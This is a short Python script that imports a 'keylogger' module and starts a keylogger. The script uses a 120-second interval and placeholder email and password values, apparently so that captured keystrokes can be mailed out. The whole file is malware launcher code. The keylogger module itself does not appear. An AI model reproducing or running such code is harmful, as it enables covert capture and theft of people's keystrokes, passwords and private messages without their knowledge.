#!/usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(120, "defaultEmail", "defaultPassword")
my_keylogger.start()
